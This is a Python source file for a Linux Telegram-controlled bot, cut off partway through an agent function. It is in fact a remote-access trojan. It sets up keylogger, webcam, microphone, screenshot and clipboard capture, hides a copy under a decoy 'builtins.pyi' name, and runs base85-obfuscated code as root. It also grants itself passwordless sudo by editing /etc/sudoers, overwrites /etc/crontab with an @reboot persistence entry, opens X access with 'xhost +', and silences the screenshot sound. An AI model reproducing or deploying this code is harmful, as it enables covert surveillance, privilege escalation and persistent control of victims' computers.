# CREATOR 
# NAME: Vladislav 
# SURNAME: Khudash  
# AGE: 17

# DATE: 14.10.2025
# APP: BOT
# TYPE: BOT_TELEGRAM
# VERSION: LATEST
# PLATFORM: linux


#-
#--
#---
#----
#-----
#------
TOKEN = 'HERE IS THE TELEGRAM BOT TOKEN'
PATH = 'HERE IS THE PATH TO SAVE THE BOT'
PASSWORD = 'HERE IS THE PASSWORD FOR THE SESSION WITH THE BOT'
#------
#-----
#----
#---
#--
#-


# FOR ENCRYPTION OR DECRYPTION
#------------------------------#
KEY_SESSION = ''
KEY_LENGTH = ''
KEY_PATTERN_MAIN = ''
KEY_PATTERN_ANOTHER = ''
PATTERN_SYMBOLS = []
KEY_SYMBOLS = ''
#------------------------------#


import os
import sys
import subprocess as sp

from re import sub, search, findall, MULTILINE
from webbrowser import open as open_website
from json import loads as parse_json
from random import seed, choice
from datetime import datetime
from threading import Thread
from base64 import b85encode
from platform import uname
from time import sleep
from glob import glob


def init():
    global TOKEN, PASSWORD
    global ID, PLATFORM, USER, PYTHON_VERSION, INSTALLER_PACKAGES, PACKAGES, installed_packages, LIBS, installed_libs, libs_error, URL_IPCONFIG, URL_IPCONFIG_KEYS, HEADERS
    global BOT_NAME, PATH, BOT_RESERVE_NAME, PATH_RESERVE, PATH_PYTHON, PATH_PIP, PATH_SYS, PATH_SERVICES, PATH_USERS, PATH_TOOLS, PATH_TMP, PATH_MODULE_BLOCKER_APP, PATH_MODULE_KEYLOGGER, PATH_MODULE_AGENT, PATH_STARTUP, PATH_BLACKLIST_WEBSITES
    global KEY_SESSION, KEY_LENGTH, KEY_PATTERN_MAIN, KEY_PATTERN_ANOTHER, PATTERN_SYMBOLS, KEY_SYMBOLS, KEYLOGGER_KEYS, session_symbols
    global TeleBot, opencv, pygui, keyboard 
    global showinfo, showwarning, showerror, buffer_get, buffer_copy, get_domain_ips, encryptFile, decryptFile, screenshot_array, get_http_code, paInt16, PyAudio, open_audio, tabulate, detect
    
    PYTHON_VERSION = sys.version[0]

    if os.path.exists('/etc/os-release'):
        try:
            with open('/etc/os-release', 'r') as os_release:
                os_data = os_release.read()
        except:
            os_data = 'NOT FOUND'
    else:
        raise SystemError

    try:
        ID = search(r'ID=(\w+)', os_data).group(1).lower().strip()
        PLATFORM = search(r'PRETTY_NAME="(\S.+)"', os_data).group(1).strip()
    except:
        ID = 'DEFAULT'
        PLATFORM = 'DEFAULT'

    try:
        with open(f'{PATH}/sys/setup.bin', 'r') as setup_bin:
            setup_flag = False if setup_bin.read().strip() == '1991' else True
    except:
        setup_flag = True

    BOT_NAME = os.path.split(__file__)[-1]

    USER = os.getlogin()

    if os.getuid() == 0:
        sp.run(['sudo', '-u', USER, f'python{PYTHON_VERSION}', __file__])
        os.abort()
    
    if setup_flag:
        sp.run(['sudo', 'su', '-c', 'echo'])
        
    if os.path.exists(__file__):
        os.chmod(__file__, 0o755)

    BOT_RESERVE_NAME = 'builtins.pyi'
    PATH_RESERVE = f'/home/{USER}/.config/python-builtins-tmp'

    PACKAGES = [
        'net-tools',
        'wine',
        'vlc',
        'feh',
        'xclip'
    ]

    libs_error = ''
    LIBS = [
        'telebot',
        'opencv-python',
        'pyautogui',
        'keyboard',
        'tkinter',
        'pyperclip',
        'dnspython',
        'pyaescrypt',
        'numpy',
        'requests',
        'pyaudio',
        'tabulate',
        'chardet'
    ]

    if not os.path.exists(PATH):
        creator_folder(PATH)
        
        if not os.path.exists(PATH):
            PATH = f'/home/{USER}/.config/sys-tmp'
            creator_folder(PATH)

    if not os.path.exists(f'/home/{USER}/.config'): 
        creator_folder(f'/home/{USER}/.config')

    PATH_PYTHON = f'{PATH}/venv/bin/python{PYTHON_VERSION}'
    PATH_PIP = f'{PATH}/venv/bin/pip{PYTHON_VERSION}'
    PATH_SYS = f'{PATH}/sys'
    PATH_SERVICES = f'{PATH}/services'
    PATH_USERS = f'{PATH}/users'
    PATH_TOOLS = f'{PATH}/tools'
    PATH_TMP = f'{PATH}/tmp'
    PATH_MODULE_BLOCKER_APP = f'{PATH_SYS}/module.app'
    PATH_MODULE_KEYLOGGER = f'{PATH_SYS}/keyboard.log'
    PATH_MODULE_AGENT = f'{PATH_SYS}/module.agent'
    PATH_STARTUP = f'{PATH_SYS}/startup'
    PATH_BLACKLIST_WEBSITES = f'{PATH_SYS}/blacklist.websites'

    if not (len(TOKEN[:TOKEN.index(':')]) == 10 and len(TOKEN[TOKEN.index(':') + 1:]) == 35):
        raise ValueError

    if not PASSWORD or type(PASSWORD) is not str:
        PASSWORD = '123'

    if not KEY_SESSION.isdigit():
        KEY_SESSION = '2008'

    if not KEY_LENGTH.isdigit():
        KEY_LENGTH = '6'

    if not KEY_PATTERN_MAIN or type(KEY_PATTERN_MAIN) is not str:
        KEY_PATTERN_MAIN = '$#&'

    if not KEY_PATTERN_ANOTHER or type(KEY_PATTERN_ANOTHER) is not str:
        KEY_PATTERN_ANOTHER = '!*^'

    if not PATTERN_SYMBOLS or type(PATTERN_SYMBOLS) is not list:
        PATTERN_SYMBOLS = [' ', '\n', '\r', '\t', '\f', '\v', '=', '+', '-', '*', '/', '%', '<', '>', '^', '~', '&', '|', '!', '?', '@', '#', '$', ':', ';', '.', ',', '\\', "'", '"', '`', '(', ')', '[', ']', '{', '}', '_', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm', 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', 'а', 'б', 'в', 'г', 'д', 'е', 'ё', 'ж', 'з', 'и', 'й', 'к', 'л', 'м', 'н', 'о', 'п', 'р', 'с', 'т', 'у', 'ф', 'х', 'ц', 'ч', 'ш', 'щ', 'ъ', 'ы', 'ь', 'э', 'ю', 'я', 'А', 'Б', 'В', 'Г', 'Д', 'Е', 'Ё', 'Ж', 'З', 'И', 'Й', 'К', 'Л', 'М', 'Н', 'О', 'П', 'Р', 'С', 'Т', 'У', 'Ф', 'Х', 'Ц', 'Ч', 'Ш', 'Щ', 'Ъ', 'Ы', 'Ь', 'Э', 'Ю', 'Я']

    if not KEY_SYMBOLS or type(KEY_SYMBOLS) is not str:
        KEY_SYMBOLS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+,-.:;<=>?@[]^_{|}~'

    KEYLOGGER_KEYS = ['windows', 'ctrl', 'right ctrl', 'shift', 'right shift', 'alt', 'right alt', 'tab', 'caps lock', 'up', 'down', 'left', 'right', 'insert', 'home', 'page up', 'page down', 'delete', 'decimal', 'end', 'print screen', 'scroll lock', 'pause', 'num lock', 'clear', 'esc', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12']

    seed(int(KEY_SESSION))

    session_symbols = {}

    for symbol in PATTERN_SYMBOLS:
        session_symbols[symbol] = generator_symbols()

    if ID in ['arch', 'manjaro']:
        INSTALLER_PACKAGES = 'pacman'

        installed_packages = decode_shell_output('sudo pacman -Q'.split())

        PACKAGES.append('python')
        PACKAGES.append('python-pip')
        PACKAGES.append('portaudio')
        PACKAGES.append('python-tk')
        PACKAGES.append('gnome-screenshot')
        PACKAGES.append('xorg-server-xvfb')
        PACKAGES.append('libnotify')
        PACKAGES.append('networkmanager')
        PACKAGES.append('iproute2')
        PACKAGES.append('wireless_tools')

    elif ID in ['fedora']:
        INSTALLER_PACKAGES = 'dnf'

        installed_packages = decode_shell_output('sudo dnf list installed'.split())

        PACKAGES.append(f'python{PYTHON_VERSION}')
        PACKAGES.append(f'python{PYTHON_VERSION}-pip')
        PACKAGES.append(f'python{PYTHON_VERSION}-devel')
        PACKAGES.append('portaudio-devel')
        PACKAGES.append(f'python{PYTHON_VERSION}-tkinter')
        PACKAGES.append('gnome-screenshot')
        PACKAGES.append('xorg-x11-server-Xvfb')
        PACKAGES.append('libnotify')
        PACKAGES.append('NetworkManager')
        PACKAGES.append('iproute')
        PACKAGES.append('wireless-tools')

    elif ID in ['centos', 'rhel']:
        INSTALLER_PACKAGES = 'yum'
        
        installed_packages = decode_shell_output('sudo yum list installed'.split())

        PACKAGES.append(f'python{PYTHON_VERSION}')
        PACKAGES.append(f'python{PYTHON_VERSION}-pip')
        PACKAGES.append(f'python{PYTHON_VERSION}-devel')
        PACKAGES.append('portaudio-devel')
        PACKAGES.append(f'python{PYTHON_VERSION}-tkinter')
        PACKAGES.append('gnome-screenshot')
        PACKAGES.append('xorg-x11-server-Xvfb') 
        PACKAGES.append('libnotify')
        PACKAGES.append('NetworkManager')
        PACKAGES.append('iproute')
        PACKAGES.append('wireless-tools')

    elif ID in ['opensuse', 'sles', 'suse']:
        INSTALLER_PACKAGES = 'zypper'

        installed_packages = decode_shell_output('sudo zypper search -i'.split())

        PACKAGES.append(f'python{PYTHON_VERSION}')
        PACKAGES.append(f'python{PYTHON_VERSION}-pip')
        PACKAGES.append(f'python{PYTHON_VERSION}-venv')
        PACKAGES.append(f'python{PYTHON_VERSION}-devel')
        PACKAGES.append('portaudio-devel')
        PACKAGES.append(f'python{PYTHON_VERSION}-tk')
        PACKAGES.append('gnome-screenshot')
        PACKAGES.append('xorg-x11-server-Xvfb')
        PACKAGES.append('libnotify-tools')
        PACKAGES.append('NetworkManager')
        PACKAGES.append('iproute2')
        PACKAGES.append('wireless-tools')

    elif ID in ['alpine']:
        INSTALLER_PACKAGES = 'apk'

        installed_packages = decode_shell_output('sudo apk info'.split())

        PACKAGES.append(f'python{PYTHON_VERSION}')
        PACKAGES.append(f'py{PYTHON_VERSION}-pip')
        PACKAGES.append(f'python{PYTHON_VERSION}-dev')
        PACKAGES.append('portaudio-dev')
        PACKAGES.append(f'python{PYTHON_VERSION}-tkinter')
        PACKAGES.append('scrot')
        PACKAGES.append('xvfb')
        PACKAGES.append('libnotify')
        PACKAGES.append('networkmanager')
        PACKAGES.append('iproute2')
        PACKAGES.append('wireless-tools')
        
    else:
        INSTALLER_PACKAGES = 'apt'

        installed_packages = decode_shell_output('sudo apt list --installed'.split())

        PACKAGES.append(f'python{PYTHON_VERSION}')
        PACKAGES.append(f'python{PYTHON_VERSION}-pip')
        PACKAGES.append(f'python{PYTHON_VERSION}-venv')
        PACKAGES.append(f'python{PYTHON_VERSION}-dev') 
        PACKAGES.append('portaudio19-dev')
        PACKAGES.append(f'python{PYTHON_VERSION}-tk')
        PACKAGES.append('gnome-screenshot')
        PACKAGES.append('xvfb')
        PACKAGES.append('libnotify-bin')
        PACKAGES.append('network-manager')
        PACKAGES.append('iproute2')
        PACKAGES.append('wireless-tools')

    installed_libs = decode_shell_output([PATH_PIP, 'list'])

    path_install_flag = f'/home/{USER}/.install.flag'

    if setup_flag and not os.path.exists(path_install_flag): 
        with open(path_install_flag, 'w') as install_flag:
            install_flag.write(BOT_NAME)

        sp.run([f'python{PYTHON_VERSION}', __file__, '&'])
        os.abort()

    setup() 

    if os.path.exists(path_install_flag):
        del_file(path_install_flag)

    python_root(f"""from glob import glob\nfrom os import remove
for tmp_file in glob(f'{PATH_TMP}/*'):
    try:
        remove(tmp_file)
    except:
        continue""")

    for path_lib in glob(f'{PATH}/venv/lib/*'):
        if 'python' in path_lib:
            for path_package in glob(f'{path_lib}/*'):
                if 'packages' in path_package:
                    if not path_package in sys.path:
                        sys.path.append(path_package)
                        break 

    try:
        from telebot import TeleBot
    except BaseException as error: 
        write_lib_error('telebot', error)

    try:
        import cv2 as opencv
    except BaseException as error: 
        write_lib_error('opencv-python', error)

    try:
        import pyautogui as pygui
        pygui.FAILSAFE = False
        del_screenshot_sound()
    except BaseException as error: 
        write_lib_error('pyautogui', error)
        sp.run('xhost +'.split(), stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)

    try:
        import keyboard
    except BaseException as error: 
        write_lib_error('keyboard', error)

    try:
        from tkinter.messagebox import showinfo, showwarning, showerror
    except BaseException as error: 
        write_lib_error('tkinter', error)

    try:
        from pyperclip import paste as buffer_get, copy as buffer_copy
    except BaseException as error: 
        write_lib_error('pyperclip', error)
    
    try:
        from dns.resolver import resolve as get_domain_ips
    except BaseException as error: 
        write_lib_error('dnspython', error)

    try:
        from pyAesCrypt import encryptFile, decryptFile 
    except BaseException as error: 
        write_lib_error('pyAesCrypt', error)

    try:
        from numpy import array as screenshot_array
    except BaseException as error: 
        write_lib_error('numpy', error)

    try:
        from requests import get as get_http_code
    except BaseException as error: 
        write_lib_error('requests', error)
    
    try:
        from pyaudio import paInt16, PyAudio
    except BaseException as error: 
        write_lib_error('pyaudio', error)
    try:
        from wave import open as open_audio
    except BaseException as error: 
        write_lib_error('wave', error)

    try:
        from tabulate import tabulate
    except BaseException as error: 
        write_lib_error('tabulate', error)
    try:
        from chardet import detect
    except BaseException as error: 
        write_lib_error('chardet', error)

    URL_IPCONFIG = 'https://ipinfo.io/json'
    URL_IPCONFIG_KEYS = {
        'ip': 'ip',
        'isp': 'org',
        'country': 'country',
        'region': 'region',
        'city': 'city',
        'latitude': '',
        'longitude': '',
        'coordinate': 'loc'
    }

    HEADERS = choice([{'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:50.0.1) Gecko/20100101 Firefox/50.0.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.7.4) Gecko/20100101 Firefox/52.7.4'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6; rv:58.0.2) Gecko/20100101 Firefox/58.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Safari/537.36 OPR/55.0.2994.61'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0.2) Gecko/20100101 Firefox/56.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; rv:57.0.3) Gecko/20100101 Firefox/57.0.3'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2; rv:52.8.1) Gecko/20100101 Firefox/52.8.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6; rv:60.2.2) Gecko/20100101 Firefox/60.2.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36 OPR/54.0.2952.64'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Safari/537.36 OPR/52.0.2871.99'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Safari/537.36 OPR/50.0.2762.67'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 OPR/55.0.2994.37'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626 Safari/537.36 OPR/56.0.3051.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36 OPR/55.0.2994.47'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:66.0.3) Gecko/20100101 Firefox/66.0.3'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1; rv:52.5.2) Gecko/20100101 Firefox/52.5.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0.2) Gecko/20100101 Firefox/59.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:52.1.1) Gecko/20100101 Firefox/52.1.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6; rv:59.0.2) Gecko/20100101 Firefox/59.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6; rv:58.0.2) Gecko/20100101 Firefox/58.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:57.0.2) Gecko/20100101 Firefox/57.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2; rv:52.1.0) Gecko/20100101 Firefox/52.1.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1; rv:66.0.5) Gecko/20100101 Firefox/66.0.5'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6; rv:62.0.2) Gecko/20100101 Firefox/62.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.3.0) Gecko/20100101 Firefox/60.3.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/52.0.2871.64'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:59.0.2) Gecko/20100101 Firefox/59.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809 Safari/537.36 OPR/58.0.3135.107'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36 OPR/54.0.2952.64'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0.1) Gecko/20100101 Firefox/51.0.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1; rv:52.8.1) Gecko/20100101 Firefox/52.8.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6; rv:50.0.2) Gecko/20100101 Firefox/50.0.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0 Safari/537.36 OPR/58.0.3135.127'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6; rv:65.0.1) Gecko/20100101 Firefox/65.0.1'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/52.0.2871.64'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.5.2) Gecko/20100101 Firefox/60.5.2'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/56.0.3051.52'}])
 

def setup():     
    creator_folder([
        PATH, 
        PATH_SYS,
        PATH_SERVICES,
        PATH_USERS, 
        PATH_TOOLS,
        PATH_TMP
    ])

    try:
        if not os.path.exists(f'{PATH}/{BOT_NAME}'):
            __import__('shutil').move(__file__, f'{PATH}/{BOT_NAME}')
    except: ...
    
    setup_rights()    

    for package in PACKAGES:
        if check_package_or_lib(package, installed_packages):
            install_package(package)

    if not os.path.exists(f'{PATH}/venv'):
        sp.run([f'python{PYTHON_VERSION}', '-m', 'venv', f'{PATH}/venv'], stdout=sp.DEVNULL, stderr=sp.DEVNULL, input=False)

    for lib in LIBS:
        if check_package_or_lib(lib, installed_libs):
            pip_install(lib)

    with open(f'{PATH}/sys/sys-shell.sh', 'w') as sys_shell_sh:
        sys_shell_sh.write(f'#!/bin/bash\n"{PATH_PYTHON}" "{PATH}/{BOT_NAME}"')
    os.chmod(f'{PATH}/sys/sys-shell.sh', 0o755)

    with open(f'{PATH}/sys/setup.bin', 'w') as setup_bin:
        setup_bin.write('1991')


def setup_rights():
    crontab_data = '''# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
'''
    python_root(r'''
from os.path import exists
                
                
if not exists('/etc/crontab'):
    with open('/etc/crontab', 'w') as crontab:
        crontab.write(crontab_data)
else:
    with open('/etc/crontab', 'r') as crontab:
        crontab_check = crontab.read().strip()

    if not ('SHELL=/bin/sh' in crontab_check) or ('SHELL=/bin/bash' in crontab_check):
        with open('/etc/crontab', 'w') as crontab:
            crontab.write(crontab_data)
'''.strip())

    if INSTALLER_PACKAGES == 'pacman':
        install_package('cronie')
        start_service('cronie.service')
    elif INSTALLER_PACKAGES == 'dnf' or INSTALLER_PACKAGES == 'yum':
        install_package('cronie')
        start_service('crond')
    elif INSTALLER_PACKAGES == 'apk':
        install_package('dcron')
        start_service('dcron')
    else:
        install_package('cron')
        start_service('cron')

    python_root(r'''def change_file(path, text, pattern=''): 
    if not pattern:
        pattern = text

    with open(path, 'r') as file:
        file_text = file.readlines()
        
    for text_line in file_text:
        if pattern in text_line:
            text_line_index = file_text.index(text_line)
            file_text[text_line_index] = text + '\n'
            break
    else:
        file_text.append(f'\n{text}\n')

    with open(path, 'w') as file: 
        for text_line in file_text:
            file.write(text_line)''' + f'''\n\n
change_file('/etc/sudoers', '{USER} ALL=(ALL) NOPASSWD: {escape_path(PATH)}')
change_file('/etc/crontab', '@reboot {USER} "{PATH}/sys/sys-shell.sh"')''')


def escape_path(path):
    if '\\' in path:
        path = path.replace('\\', '\\\\')

    path = sub(r'\t', r'\\t', path)

    if ' ' in path:
        path = path.replace(' ', r'\ ')

    return path


def generate_name_tmp():
    return generator_symbols('25', '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')


def python_root(code, output=False):
    path = f'{PATH_TMP}/{generate_name_tmp()}'

    with open(path, 'w') as root_python_file:
        root_python_file.write(f'#!/usr/bin/env python{PYTHON_VERSION}\nimport sys as __sys;__sys.path={sys.path};from base64 import b85decode as __b85decode;exec(__b85decode({b85encode(code.encode())}))')
    os.chmod(path, 0o755)

    if output:
        result = decode_shell_output(['sudo', path])
        del_file(path)
        return result
    else: 
        sp.run(['sudo', path], stdout=sp.DEVNULL, stdin=sp.DEVNULL)
        del_file(path)


def setup_module(module, name, module_flag, send_function, mode):
    if mode == '-e':
        with open(module_flag, 'w') as module_status: 
            module_status.write('1')
        
        if name == 'app':
            Thread(target=module, args=('', 'start', True, send_function), name=name).start()
        else:
            Thread(target=module, args=(True, send_function), name=name).start()
    else: 
        with open(module_flag, 'w') as module_status: 
            module_status.write('0')


def start_modules():
    for module in [
        (module_agent, PATH_MODULE_AGENT + '.flag', 'agent'),
        (module_keylogger, PATH_MODULE_KEYLOGGER + '.flag', 'keylogger'), 
        (module_blocker_app, PATH_MODULE_BLOCKER_APP + '.flag', 'app')
    ]:
        try:       
            with open(module[1], 'r') as module_status:
                if module_status.read().strip() == '1': 
                    Thread(target=module[0], name=module[-1]).start()
        except: 
            continue


def module_report(path_module):
    try:
        with open(path_module, 'w') as module_status:
            module_status.write('1')
    except: 
        return
    

def module_is_disabled(path_module_flag):
    try:
        with open(path_module_flag, 'r') as module_status: 
            if module_status.read().strip() == '0': 
                return True
    except: 
        return
    

def status_module(name, module_flag):
    try:
        with open(module_flag, 'r') as module_status:
            return [name, 'off' if module_status.read().strip() == '0' else 'on'] 
    except: 
        return [name, 'off']
    

def module_agent(send=None, send_function=None):
    path_support_bot_flag = f'{PATH_SYS}/sys-agent.flag'

    if send:
        try: 
            send_function('Agent module is started')
        except: ...

    def support_bot():
        path_sys_agent_sh = f'{PATH_SYS}/sys-agent.sh'

        if not os.path.exists(PATH_SYS):
            os.mkdir(PATH_SYS)

        with open(path_sys_agent_sh, 'w') as sys_agent_sh:
            sys_agent_sh.write(f'''
